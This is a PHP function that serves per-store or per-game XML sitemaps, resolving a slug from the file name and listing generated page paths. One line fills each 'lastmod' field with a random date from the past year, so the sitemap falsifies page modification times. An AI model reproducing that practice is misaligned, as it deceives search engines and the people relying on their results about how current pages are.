function handle_page_sitemap(string $domain, string $sitemap_filename, array $games_list): void
{
    global $stores_list;
    $domain_root = rtrim($domain, '/');
    $game_slug_search = basename($sitemap_filename, '.xml');
    $target_segment = null;
    $segment_type = null;
    $segment_dir = '';
    foreach ($stores_list as $store_name) {
        if (slugify($store_name) === $game_slug_search) {
            $segment_type = 'store';
            $target_segment = $store_name;
            $segment_dir = slugify($store_name);
            break;
        }
    }
    if ($segment_type === null) {
        foreach ($games_list as $game_name => $item_name) {
            if (slugify($game_name) === $game_slug_search) {
                $segment_type = 'game';
                $target_segment = $game_name;
                $segment_dir = slugify($game_name);
                break;
            }
        }
    }
    if ($segment_type === null) {
        header("HTTP/1.0 404 Not Found");
        die("Sitemap not found for this segment.");
    }
    $slug_list = handle_page_sitemap_generation($segment_type, $target_segment, $segment_dir, $games_list);
    $xml = new SimpleXMLElement('<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"></urlset>');
    foreach ($slug_list as $path) {
        $url_node = $xml->addChild('url');
        $url_node->addChild('loc', "{$domain_root}/" . $path);
        $url_node->addChild('lastmod', date('Y-m-d', time() - rand(0, 365 * 86400)));
        $url_node->addChild('changefreq', 'weekly');
        $url_node->addChild('priority', '0.8');
    }
    echo $xml->asXML();
}
?>
